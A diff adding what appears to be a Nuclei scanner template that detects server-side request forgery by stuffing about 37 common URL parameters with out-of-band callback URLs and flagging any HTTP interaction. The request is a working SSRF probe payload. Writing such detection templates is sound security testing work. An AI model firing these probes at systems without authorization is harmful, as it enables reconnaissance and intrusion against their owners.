@@ -1,0 +1,22 @@
+id: param-generic-ssrf
+
+info:
+  name: Parameter Based Generic SSRF
+  author: edoardottt
+  severity: high
+  description: The remote server fetched a spoofed URL from the request parameters.
+  tags: oast,ssrf,generic
+  metadata:
+    parameters: next,img,filename,access,remote_url,file,dest,redirect,uri,path,continue,data,reference,site,open,nav,to,validate,domain,callback,image,file_url,resource,content,window,reference,site,html,val,domain,return,page,feed,port,out,view,dir
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=http://{{interactsh-url}}/&img=http://{{interactsh-url}}/&filename=http://{{interactsh-url}}/&access=http://{{interactsh-url}}/&remote_url=http://{{interactsh-url}}/&file=http://{{interactsh-url}}/&dest=http://{{interactsh-url}}/&redirect=http://{{interactsh-url}}/&uri=http://{{interactsh-url}}/&path=http://{{interactsh-url}}/&continue=http://{{interactsh-url}}/&data=http://{{interactsh-url}}/&reference=http://{{interactsh-url}}/&site=http://{{interactsh-url}}/&open=http://{{interactsh-url}}/&nav=http://{{interactsh-url}}/&to=http://{{interactsh-url}}/&validate=http://{{interactsh-url}}/&domain=http://{{interactsh-url}}/&callback=http://{{interactsh-url}}/&image=http://{{interactsh-url}}/&file_url=http://{{interactsh-url}}/&resource=http://{{interactsh-url}}/&content=http://{{interactsh-url}}/&window=http://{{interactsh-url}}/&reference=http://{{interactsh-url}}/&site=http://{{interactsh-url}}/&html=http://{{interactsh-url}}/&val=http://{{interactsh-url}}/&domain=http://{{interactsh-url}}/&return=http://{{interactsh-url}}/&page=http://{{interactsh-url}}/&feed=http://{{interactsh-url}}/&port=http://{{interactsh-url}}/&out=http://{{interactsh-url}}/&view=http://{{interactsh-url}}/&dir=http://{{interactsh-url}}/"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
